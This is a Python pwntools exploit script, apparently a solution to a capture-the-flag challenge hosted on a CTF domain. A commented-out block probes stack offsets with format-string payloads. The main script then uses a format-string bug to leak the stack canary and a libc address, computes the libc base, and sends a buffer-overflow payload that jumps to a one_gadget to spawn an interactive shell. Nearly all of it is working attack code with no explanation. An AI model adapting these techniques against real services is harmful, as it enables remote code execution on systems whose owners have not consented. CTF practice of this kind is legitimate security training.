#This part of code for leaks 
'''
from pwn import *
context.log_level="debug"



elf = ELF("./main",checksec=False)
context.arch=elf.arch
url="blackhat4-eda51692f85de2ba465ea9fe04693d42-0.chals.bh.ctf.sa"
p=remote(url, 443, ssl=True, sni=url)

def leak_stack():
    context.log_level="warn"
    for i in range(1,40):
        payload=f"%{i}$p"
        p=remote(url, 443, ssl=True, sni=url)
        try:
            p.sendlineafter("Please fill in your name:\n",payload)
            p.recvuntil("Thank you ")
            res=p.recvuntil("So let's g")
            x=res.split(b"So let's g")[0].strip()
            print(i, "-->",x)
            #print(i, "-->",res)
        except Exception as e:
            print(i, "ERROR",e)

        p.close()
leak_stack()

'''

from pwn import *
context.terminal = ["tmux", "splitw", "-h","-p","60"]


context.log_level="debug"



elf = ELF("./main",checksec=False)
context.arch=elf.arch
url="blackhat4-eda51692f85de2ba465ea9fe04693d42-0.chals.bh.ctf.sa"
p=remote(url, 443, ssl=True, sni=url)   
libc=ELF("libc.so.6",checksec=False)#FROM ubuntu:18.04
libc.symbols["one_1"]=0x4f2a5
libc.symbols["one_2"]=0x4f302
libc.symbols["one_3"]=0x10a2fc


libc_start_main=23    #__libc_start_main+231
canary_leak_offset=11
p.sendlineafter("Please fill in your name:\n",f"%{libc_start_main}$p|%{canary_leak_offset}$p|")
p.recvuntil("Thank you ")
r_data=p.recvuntil("So let's g").split(b"So let's g")[0].strip()
print(r_data)
cnary=int(r_data.split(b"|")[1],16)
libc_start_main=int(r_data.split(b"|")[0],16)
libc.address=libc_start_main-(libc.symbols["__libc_start_main"]+231)
print("cnary",hex(cnary))
print("libc_start_main",hex(libc_start_main))
print("libc.address",hex(libc.address))

canary_offset=cyclic_find("oaaa")
bof_offset=cyclic_find("caaa")
payload=flat(
    "X"*canary_offset,
    p64(cnary),
   "A"*bof_offset,
    p64(libc.symbols["one_2"])
)
p.sendlineafter("exploit me :).",payload)

p.interactive()

